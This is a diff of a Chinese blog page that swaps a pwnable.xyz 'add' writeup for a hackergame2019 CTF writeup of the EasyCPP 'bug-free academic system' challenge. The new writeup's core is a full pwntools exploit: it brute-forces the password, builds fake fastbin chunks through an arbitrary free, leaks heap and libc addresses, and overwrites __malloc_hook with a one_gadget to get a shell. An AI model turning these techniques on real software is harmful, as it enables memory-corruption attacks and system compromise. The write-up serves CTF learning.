@@ -3,36 +3,37 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
   
-  <title>pwnable.xyz add WriteUP - thatshaman&#39;s site</title>
+  <title>hackergame2019 没有bug的教务系统 Writeup - thatshaman&#39;s site</title>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
   
 
   <link rel="shortcut icon" href="/home.png" type="image/png">
-  <meta name="description" content="pwnable.xyz 上的add的WriteUP。">
+  <meta name="description" content="中科大hackergame2019里 没有bug的教务系统 的writeup">
 <meta name="keywords" content="ctf,pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.xyz add WriteUP">
-<meta property="og:url" content="http://shiroinu.top/2019/08/08/add/index.html">
+<meta property="og:title" content="hackergame2019 没有bug的教务系统 Writeup">
+<meta property="og:url" content="http://shiroinu.top/2019/11/02/hackergame2019-easyCPP-wp/index.html">
 <meta property="og:site_name" content="thatshaman&#39;s site">
-<meta property="og:description" content="pwnable.xyz 上的add的WriteUP。">
+<meta property="og:description" content="中科大hackergame2019里 没有bug的教务系统 的writeup">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://i2.tiimg.com/696456/0f3701a7745115c4.png">
-<meta property="og:image" content="http://i2.tiimg.com/696456/745835338a81ed4f.png">
-<meta property="og:image" content="http://i2.tiimg.com/696456/6cef7378623e6976.png">
-<meta property="og:updated_time" content="2019-08-08T13:52:55.183Z">
+<meta property="og:image" content="https://i.loli.net/2019/11/02/UYhXblJrTtVEcjP.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/02/BXERUAtxlVcLGH7.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/02/2pTde9CLxwOEmAy.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/11/02/3REaMuLSAfpOz57.jpg">
+<meta property="og:updated_time" content="2019-11-02T14:53:52.437Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.xyz add WriteUP">
-<meta name="twitter:description" content="pwnable.xyz 上的add的WriteUP。">
-<meta name="twitter:image" content="http://i2.tiimg.com/696456/0f3701a7745115c4.png">
+<meta name="twitter:title" content="hackergame2019 没有bug的教务系统 Writeup">
+<meta name="twitter:description" content="中科大hackergame2019里 没有bug的教务系统 的writeup">
+<meta name="twitter:image" content="https://i.loli.net/2019/11/02/UYhXblJrTtVEcjP.png">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
    
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1572706494154">
+  <link rel="stylesheet" href="/css/style.css?v=1572706494227">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -162,31 +163,100 @@
         
             <img src="/images/back1.png">
         
-        <h1>pwnable.xyz add WriteUP</h1>
+        <h1>hackergame2019 没有bug的教务系统 Writeup</h1>
     </div>
   <div class="nexmoe-post-meta">
-    <a><i class="nexmoefont icon-calendar-fill"></i>2019年08月08日</a>
-    <a><i class="nexmoefont icon-areachart"></i>188 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
+    <a><i class="nexmoefont icon-calendar-fill"></i>2019年11月02日</a>
+    <a><i class="nexmoefont icon-areachart"></i>810 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 4 分钟</a>
     
     
       <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
     
   </div>
   <article>
-    <p>pwnable.xyz 上的add的WriteUP。</p>
+    <p>中科大hackergame2019里 没有bug的教务系统 的writeup</p>
 <a id="more"></a>
-
-<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="http://i2.tiimg.com/696456/0f3701a7745115c4.png" alt="Markdown"></p>
-<p>依旧是拖进IDA</p>
-<p><img src="http://i2.tiimg.com/696456/745835338a81ed4f.png" alt="Markdown"></p>
-<p><img src="http://i2.tiimg.com/696456/6cef7378623e6976.png" alt="Markdown"></p>
-<p>注意到<code>win()</code>函数可获得flag，地址为0x400822 == 4196386。而<code>v7[v6] = v4 + v5</code>这一步可以任意覆写栈上内容，只要利用这个修改位于<code>rbp + 8</code>的ret地址，然后在第二次while循环时输入任意非数字字符使得<code>scanf()</code>返回值 != 3，在return时就可cat /flag 。</p>
-<h2 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h2><p> v7 = rbp - 60h ; ret地址 = rbp + 8h ; 因此距离为0x68 = 104。值得注意的是v7数组类型是 <em>int64</em> ，占8个字节，所以 v6应该等于 104 / 8 == 13。  </p>
-<p>另一边，v4 + v5 = win()函数的入口地址 = 4196386d即可。</p>
-<h3 id="最终输入"><a href="#最终输入" class="headerlink" title="最终输入"></a>最终输入</h3><p>依旧不用写EXP</p>
-<p>第一次循环 v4 = 4196385 v5 = 1 v6 =13</p>
-<p>第二次循环，随便打个字母就行。</p>
+<p>先引用一下官方的wp</p>
+<blockquote>
+<p><a href="https://github.com/ustclug/hackergame2019-writeups/tree/master/official/%E6%B2%A1%E6%9C%89_BUG_%E7%9A%84%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">官方writeup</a></p>
+</blockquote>
+<h1 id="核心思路"><a href="#核心思路" class="headerlink" title="核心思路"></a>核心思路</h1><p>即利用edit info中 v5的任意地址free</p>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>核心就在于editInfo()以及setPassword()<br><img src="https://i.loli.net/2019/11/02/UYhXblJrTtVEcjP.png" alt="setPassword"><br><img src="https://i.loli.net/2019/11/02/BXERUAtxlVcLGH7.png" alt="editInfo"><br>setPassword()中的s[]距editInfo()中v5的偏移为0x80<br><img src="https://i.loli.net/2019/11/02/2pTde9CLxwOEmAy.jpg" alt="setPassword"></p>
+<p><img src="https://i.loli.net/2019/11/02/3REaMuLSAfpOz57.jpg" alt="editInfo"></p>
+<blockquote>
+<p>偏移量 = 0x7ffd3a074ba0 - 0xB0 - 0x7ffd3a074ba0 + 0x30  = - 0x80</p>
+</blockquote>
+<p>具体过程见EXP的注释 </p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre><code class="python">#encoding:utf-8
+from pwn import *
+password = &#39;\x44\x00\x02\x41\x43\x47\x10\x63\x00&#39;
+one_gadget_offset = 0xf02a4
+pswd_addr = 0x6032E0
+context.log_level = &#39;DEBUG&#39;
+elf =ELF(&#39;./EasyCPP&#39;)
+pswd = map(lambda x:ord(x) , list(password))
+ans = &#39;&#39;
+#sh = process(&#39;./EasyCPP&#39;)
+for i in reversed(range(8)):
+    for x in range(256):
+        if(pswd[i] == (((x | pswd[i + 1]) &amp; ~(x &amp; pswd[i + 1]) | i) &amp; ~((x | pswd[i + 1]) &amp; ~(x &amp; pswd[i + 1]) &amp; i))):
+            pswd[i] = x
+            break
+ans = &#39;&#39;.join(map(lambda x : chr(x) , pswd) )
+def edit(ps , stu):
+    sh.sendlineafter(&#39;Please tell me your choice:&#39;,&#39;1&#39;)
+    sh.sendafter(&#39;Your new password:&#39;,ps)
+    sh.sendafter(&#39;please:&#39;,stu)
+    sh.sendlineafter(&#39;grade(0~100):&#39;,&#39;0&#39;)
+    sh.sendlineafter(&#39;grade:&#39;,&#39;0&#39;)
+    sh.sendlineafter(&#39;grade:&#39;,&#39;0&#39;)
+    sh.sendlineafter(&#39;grade:&#39;,&#39;0&#39;)
+sh = process(&#39;./EasyCPP&#39;)
+#gdb.attach(sh)
+sh.recvuntil(&#39;Username:&#39;)
+sh.sendline(&#39;admin&#39;)
+sh.recvuntil(&#39;Password:&#39;)
+sh.send(ans)</code></pre>
+<pre><code class="python">payload = (p64(0) + p64(0x21) + p64(0)*2 +p64(0) + p64(0x21) + p64(0) *2 + p64(0) + p64(0x21) + p64(0) *2).ljust(0x80,&#39;\x00&#39;)
+payload += p64(0)
+edit(payload,&#39;a&#39; * 0x20)
+# 第一次循环是为了将v4 free 置入fastbin中,因此fake chunk其实不必构造
+# v4是malloc(0x0B) 即 len(&#39;PB19000001&#39;) + 1 实际size = 0x21
+payload = (p64(0) + p64(0x21) + p64(0)*2 +p64(0) + p64(0x21) + p64(0) *2 + p64(0) + p64(0x21) + p64(0) *2).ljust(0x80,&#39;\x00&#39;)
+payload += p64(pswd_addr + 0x10)
+edit(payload,&#39;a&#39;)
+# 第二次循环 构造size = 0x21的fake_chunk 使得在T-&gt;edit中malloc(1) 得到最小chunk
+# free(fake_chunk) 再在 T-&gt;edit 中将其malloc出来，且仅修改最低一字节为0x61
+sh.recvuntil(&#39;STUDENT: &#39;)
+heap_addr = u64(sh.recvuntil(&#39;GPA:&#39;)[:-4].ljust(8,&#39;\x00&#39;))
+log.info(&#39;heap_addr = &#39; + hex(heap_addr))
+# 泄露heap地址 偏移固定
+payload = (p64(0) + p64(0x21) + p64(0)*2 +p64(0) + p64(0x21) + p64(0) *2 + p64(0) + p64(0x21) + p64(0) *2).ljust(0x80,&#39;\x00&#39;)
+payload += p64(heap_addr - 0x41)
+edit(payload ,p64(elf.got[&#39;setvbuf&#39;]))
+sh.recvuntil(&#39;STUDENT: &#39;)
+# 第三次循环 heap_addr - 0x41 = 程序开始时malloc(0x18)的T所在chunk ,fd 即为studentNum
+# 先将其free再在T-&gt;edit 中将其malloc出来 修改studentNum为got表地址 即可获得libc地址 libc题目已给出 偏移量已知
+libc_setvbuf_addr = u64(sh.recvuntil(&#39;GPA:&#39;)[:-4].ljust(8,&#39;\x00&#39;))
+libc_base = libc_setvbuf_addr - 0x6fe70
+log.info(&#39;libc_base_addr =&#39; + hex(libc_base))
+one_gadget = libc_base + one_gadget_offset
+find_fake_fast_offset = 0x23
+malloc_hook_offset = 0x3C4B10
+payload = p64(0) + p64(0x71) + p64(libc_base + malloc_hook_offset - find_fake_fast_offset) +p64(0) * 11 + p64(0) + p64(0x21) + p64(pswd_addr + 0x10) + p64(0)*2 #+ &#39;\x21&#39;
+edit(payload,&#39;a&#39; * 0x30)
+# 第四次循环, 构造fake_chunk size = 0x71 用于寻找find_fake_fast
+# 这次循环 仅为了将bss段上的pswd地址free进fastbin链中 fd会被置0</code></pre>
+<pre><code class="python">payload = p64(0) + p64(0x71) + p64(libc_base + malloc_hook_offset - find_fake_fast_offset) +p64(0) * 11 + p64(0) + p64(0x21) + p64(0) + p64(0)*2 #+ &#39;\x21&#39;
+edit(payload,&#39;\x00&#39; * 0x60)
+# 第五次循环 UAF 修改刚刚被free的fake chunk 的fd = fake_fast 然后将其malloc 此时已不必利用free(v5) 因此是p64(0)
+payload = p64(0) + p64(0x71) + p64(libc_base + malloc_hook_offset - find_fake_fast_offset) +p64(0) * 11 + p64(0) + p64(0x21) + p64(0) + p64(0)*2 #+ &#39;\x21&#39;
+edit(payload,&#39;a&#39; * 0x13 + p64(one_gadget) + &#39;\x00&#39; * 69)
+# 最后一次循环 malloc fake_fast a*0x13 是算上了 find_fake_fast的chunk头0x10 修改malloc_hook 为one_gadget
+sh.sendlineafter(&#39;Please tell me your choice:&#39;,&#39;1&#39;)
+sh.sendline(&#39;1234&#39;)
+sh.interactive()</code></pre>
 
   </article>
   <section class="nexmoe-comment">
